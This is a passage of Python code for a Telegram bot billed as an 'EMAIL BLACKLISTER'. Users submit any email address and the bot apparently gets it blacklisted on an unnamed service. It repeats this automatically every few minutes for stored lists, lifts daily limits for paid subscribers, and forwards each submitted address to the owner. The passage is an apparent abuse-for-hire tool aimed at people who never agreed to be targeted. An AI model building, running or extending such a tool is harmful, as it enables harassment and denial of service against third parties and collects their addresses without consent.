                    [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
                ])
                await update.message.reply_text(
                    "❌ Invalid number! Send a whole number (e.g. 5).",
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
                return

            if days < 1:
                await update.message.reply_text("❌ Days must be at least 1!")
                return

            pending = context.user_data.get('pending_auto_emails', [])
            if not pending:
                user_states[user_id] = "idle"
                await update.message.reply_text("❌ No pending emails. Please try again.")
                return

            valid, invalid = _add_auto_emails(user, pending, days)
            context.user_data.pop('pending_auto_emails', None)
            user_states[user_id] = "idle"

            # Notify owner if not owner
            if valid and OWNER_ID and user_id != OWNER_ID:
                try:
                    email_list = "\n".join([f"• <code>{e}</code>" for e in valid])
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=(f"📥 <b>NEW AUTO EMAILS ADDED</b>\n\n"
                              f"👤 Admin: <b>{user.full_name or 'Unknown'}</b>\n"
                              f"🔗 @{user.username or 'N/A'}\n"
                              f"🆔 <code>{user.id}</code>\n\n"
                              f"📧 Added ({len(valid)}):\n{email_list}\n\n"
                              f"⏰ Duration: <b>{days} days</b>\n"
                              f"📊 Total: {len(auto_emails_list)}\n"
                              f"🕒 {datetime.now().strftime('%I:%M %p, %d-%m-%Y')}"),
                        parse_mode='HTML'
                    )
                except Exception:
                    pass

            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            response = (f"✅ <b>AUTO UPDATED</b>\n\n"
                        f"🟢 Added: <b>{len(valid)}</b>\n"
                        f"⏰ Duration: <b>{days} days</b>\n"
                        f"📊 Total: <b>{len(auto_emails_list)}</b>")
            if valid:
                response += "\n\n" + "\n".join([f"• <code>{e}</code>" for e in valid])
            await update.message.reply_text(response, reply_markup=reply_markup, parse_mode='HTML')
            return

        # ---------- Manual blacklist flow ----------
        if user_states.get(user_id) == "awaiting_email":
            if is_valid_email(message_text):
                if not has_unlimited_access(user_id):
                    count = get_user_blacklist_count(user_id)
                    if count >= MAX_BLACKLIST_LIMIT:
                        reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🏠 MAIN MENU", callback_data='back')]])
                        await update.message.reply_text(
                            f"❌ <b>DAILY LIMIT REACHED</b>\n\n"
                            f"📊 Today: <b>{count}/{MAX_BLACKLIST_LIMIT}</b>\n\n"
                            f"🕛 Resets at 12:00 AM IST\n\n"
                            f"💎 Unlimited? {OWNER_USERNAME}",
                            reply_markup=reply_markup,
                            parse_mode='HTML'
                        )
                        user_states[user_id] = "idle"
                        return
                await notify_owner_email(context, user, message_text)
                processing_msg = await update.message.reply_text(
                    f"⏳ <b>PROCESSING...</b>\n\n📧 {message_text}",
                    parse_mode='HTML'
                )
                try:
                    success, result = await asyncio.to_thread(blacklist_email, message_text)
                    if success:
                        if not has_unlimited_access(user_id):
                            increment_blacklist_count(user_id)
                        reply_markup = get_main_menu_keyboard(user_id)
                        if user_id == OWNER_ID:
                            access_note = "👑 Owner - Unlimited"
                        elif is_admin(user_id):
                            access_note = "🛡️ Admin - Unlimited"
                        elif is_subscribed(user_id):
                            access_note = "💎 Subscribed - Unlimited"
                        else:
                            count = get_user_blacklist_count(user_id)
                            remaining = MAX_BLACKLIST_LIMIT - count
                            if remaining < 0:
                                remaining = 0
                            access_note = (f"📊 Today: <b>{count}/{MAX_BLACKLIST_LIMIT}</b>\n"
                                           f"📌 Remaining: <b>{remaining}</b>\n"
                                           f"🕛 Resets at 12:00 AM IST")
                        await processing_msg.edit_text(
                            f"🎉 <b>SUCCESS!</b>\n\n"
                            f"✅ <b>BLACKLISTED!</b>\n\n"
                            f"📧 Email: <code>{message_text}</code>\n"
                            f"📊 Status: {result}\n\n"
                            f"{access_note}",
                            reply_markup=reply_markup,
                            parse_mode='HTML'
                        )
                    else:
                        reply_markup = get_main_menu_keyboard(user_id)
                        if user_id == OWNER_ID:
                            access_note = "👑 Owner"
                        elif is_admin(user_id):
                            access_note = "🛡️ Admin"
                        elif is_subscribed(user_id):
                            access_note = "💎 Unlimited"
                        else:
                            count = get_user_blacklist_count(user_id)
                            access_note = f"📊 Today: <b>{count}/{MAX_BLACKLIST_LIMIT}</b>"
                        await processing_msg.edit_text(
                            f"❌ <b>FAILED</b>\n\n"
                            f"📧 <code>{message_text}</code>\n"
                            f"📊 Status: {result}\n\n"
                            f"{access_note}",
                            reply_markup=reply_markup,
                            parse_mode='HTML'
                        )
                    user_states[user_id] = "idle"
                except Exception as e:
                    print(f"{R}[!] Blacklist error: {e}{S}", flush=True)
                    reply_markup = get_main_menu_keyboard(user_id)
                    await processing_msg.edit_text(
                        f"⚠️ <b>ERROR</b>\n\nContact: {OWNER_USERNAME}",
                        reply_markup=reply_markup,
                        parse_mode='HTML'
                    )
                    user_states[user_id] = "idle"
            else:
                reply_markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 TRY AGAIN", callback_data='blacklist')],
                    [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
                ])
                await update.message.reply_text(
                    "❌ <b>INVALID EMAIL</b>\n\n"
                    "Only ONE valid email allowed.\n\n"
                    "Example: <code>user@domain.com</code>",
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
        else:
            reply_markup = get_main_menu_keyboard(user_id)
            await update.message.reply_text(
                f"✨ <b>EMAIL BLACKLISTER</b> ✨\n\n👋 Welcome <b>{user.full_name or 'User'}</b>!",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
    except Exception as e:
        print(f"{R}[!] Error in handle_message: {e}{S}", flush=True)


# ==================== HELPERS ====================
async def check_channel_membership(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    try:
        chat_member = await context.bot.get_chat_member(chat_id=FORCE_CHANNEL_USERNAME, user_id=user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"{R}[!] Channel check error: {e}{S}", flush=True)
        return False


async def send_force_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I HAVE JOINED", callback_data='check_join')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔒 <b>CHANNEL REQUIRED</b>\n\nJoin: @Adityaapis_570",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def send_force_channel_message_update(query):
    keyboard = [
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I HAVE JOINED", callback_data='check_join')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        "🔒 <b>CHANNEL REQUIRED</b>\n\nJoin: @Adityaapis_570",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def notify_owner_new_user(context: ContextTypes.DEFAULT_TYPE, user, joined_channel: bool = True):
    if user is None:
        return
    if OWNER_ID and user.id != OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=(f"🌟 <b>NEW USER STARTED BOT</b>\n\n"
                      f"👤 Name: <b>{user.full_name or 'Unknown'}</b>\n"
                      f"🔗 Username: @{user.username or 'N/A'}\n"
                      f"🆔 User ID: <code>{user.id}</code>\n"
                      f"📢 Channel: {'✅ Joined' if joined_channel else '❌ Not joined'}\n"
                      f"🕒 {datetime.now().strftime('%I:%M %p, %d-%m-%Y')}"),
                parse_mode='HTML'
            )
        except Exception as e:
            print(f"{R}[!] Notify owner error: {e}{S}", flush=True)


async def notify_owner_email(context: ContextTypes.DEFAULT_TYPE, user, email):
    if user is None:
        return
    if OWNER_ID and user.id != OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=(f"📧 <b>EMAIL SUBMITTED</b>\n\n"
                      f"👤 {user.full_name}\n"
                      f"🔗 @{user.username or 'N/A'}\n"
                      f"🆔 <code>{user.id}</code>\n"
                      f"📩 Email: <code>{email}</code>"),
                parse_mode='HTML'
            )
        except Exception as e:
            print(f"{R}[!] Notify error: {e}{S}", flush=True)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    user_id = user.id
    user_states[user_id] = "idle"
    context.user_data.pop('pending_auto_emails', None)
    reply_markup = get_main_menu_keyboard(user_id)
    await update.message.reply_text("❌ <b>CANCELLED</b>", reply_markup=reply_markup, parse_mode='HTML')


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_users = len(users_list)
    total_blacklists = sum(u.get('blacklist_count', 0) for u in users_list)
    reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
    await update.message.reply_text(
        f"""📊 <b>BOT STATUS</b>

🟢 Status: <b>ONLINE</b>
⚡ Workers: <b>{NUM_WORKERS}</b>
👥 Users: <b>{total_users}</b>
🔥 Blacklists: <b>{total_blacklists}</b>
📊 Daily Limit: <b>{MAX_BLACKLIST_LIMIT}</b>/user
📁 Auto List: <b>{len(auto_emails_list)}</b>
⏰ Default Days: <b>{AUTO_EMAIL_DAYS}</b>
⏱️ Auto Interval: Every {AUTO_INTERVAL_MINUTES} min
🎯 Total Attempts: <b>{total_attempts_ever}</b>
🚫 Banned: <b>{len(banned_users_list)}</b>
💎 Subscribers: <b>{len(subscribers_list)}</b>
🛡️ Admins: <b>{len(admins_list) + 1}</b>

👑 Owner: {OWNER_USERNAME}""",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


# ==================== AUTO BLACKLIST SCHEDULER ====================
def schedule_auto_blacklist(application):
    try:
        if application.job_queue is None:
            raise Exception("job_queue is None")
        application.job_queue.run_repeating(
            auto_blacklist_job,
            interval=AUTO_INTERVAL_SECONDS,
            first=30,
            name="auto_blacklist_repeating"
        )
        print(f"{G}[+] Auto blacklist scheduled EVERY {AUTO_INTERVAL_MINUTES} MINUTES{S}", flush=True)
    except Exception as e:
        print(f"{R}[!] job_queue failed: {e}{S}", flush=True)
        _schedule_auto_blacklist_thread(application)


def _schedule_auto_blacklist_thread(application):
    def check_and_run():
        time.sleep(30)
        while True:
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    class FakeContext:
                        def __init__(self, bot):
                            self.bot = bot
                    ctx = FakeContext(application.bot)
                    loop.run_until_complete(auto_blacklist_job(ctx))
                finally:
                    loop.close()
                time.sleep(AUTO_INTERVAL_SECONDS)
            except Exception as e:
                print(f"{R}[!] Scheduler error: {e}{S}", flush=True)
                time.sleep(60)
    thread = threading.Thread(target=check_and_run, daemon=True)
    thread.start()


# ==================== MAIN ====================
def main():
    try:
        threading.Thread(target=run_dummy_server, daemon=True).start()

        print(f"{G}[+] Loading data...{S}", flush=True)
        load_settings()
        load_auto_log()
        load_auto_emails()
        load_users()
        load_admins()
        load_banned_users()
        load_subscribers()

        print(f"{G}[+] Building application...{S}", flush=True)

        request = HTTPXRequest(
            connection_pool_size=8,
            connect_timeout=60.0,
            read_timeout=60.0,
            write_timeout=60.0,
            pool_timeout=60.0
        )

        application = Application.builder().token(BOT_TOKEN).request(request).build()

        print(f"{G}[+] Adding handlers...{S}", flush=True)
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("cancel", cancel_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CommandHandler("broadcast", broadcast_command))
        application.add_handler(CommandHandler("ban", ban_command))
        application.add_handler(CommandHandler("unban", unban_command))
        application.add_handler(CommandHandler("bannedlist", banned_list_command))
        application.add_handler(CommandHandler("subscribe", subscribe_command))
        application.add_handler(CommandHandler("unsubscribe", unsubscribe_command))
        application.add_handler(CommandHandler("checksub", checksub_command))
        application.add_handler(CommandHandler("sublist", sublist_command))
        application.add_handler(CommandHandler("setlimit", setlimit_command))
        application.add_handler(CommandHandler("setdays", setdays_command))
        application.add_handler(CommandHandler("addadmin", addadmin_command))
        application.add_handler(CommandHandler("removeadmin", removeadmin_command))
        application.add_handler(CommandHandler("adminlist", adminlist_command))
        application.add_handler(CommandHandler("autolog", autolog_command))
        application.add_handler(CommandHandler("autoadd", autoadd_command))
        application.add_handler(CommandHandler("autoremove", autoremove_command))
        application.add_handler(CommandHandler("autolist", autolist_command))
        application.add_handler(CommandHandler("autoclear", autoclear_command))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        schedule_auto_blacklist(application)

        print(f"{G}[+] Bot is ready!{S}", flush=True)
        print(f"""
{G}╔═══════════════════════════════════════╗{S}
{G}║     ✨🌟 BOT STARTED 🌟✨           ║{S}
{G}╠═══════════════════════════════════════╣{S}
{G}║  🤖 Status: 🟢 ONLINE                 ║{S}
{G}║  👑 Owner: {OWNER_USERNAME}           ║{S}
{G}║  ⚡ Workers: {NUM_WORKERS}            ║{S}
{G}║  ⏰ Auto: Every {AUTO_INTERVAL_MINUTES} min        ║{S}
{G}║  📧 Auto List: {len(auto_emails_list)} emails       ║{S}
{G}║  📅 Default Days: {AUTO_EMAIL_DAYS}                 ║{S}
{G}║  👥 Users: {len(users_list)}          ║{S}
{G}║  📊 Daily Limit: {MAX_BLACKLIST_LIMIT}              ║{S}
{G}║  🛡️ Admins: {len(admins_list) + 1}               ║{S}
{G}╚═══════════════════════════════════════╝{S}
""", flush=True)

        try:
            application.run_polling(drop_pending_updates=True)
        except Conflict as e:
            print(f"{R}[!] Conflict Error: {e}{S}", flush=True)
        except Exception as e:
            print(f"{R}[!] Error: {e}{S}", flush=True)

    except Exception as e:
        print(f"{R}[!] Main error: {e}{S}", flush=True)
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Bot stopped by user{S}", flush=True)
        sys.exit()
    except Exception as e:
        print(f"{R}[!] Fatal error: {e}{S}", flush=True)
        import traceback
        traceback.print_exc()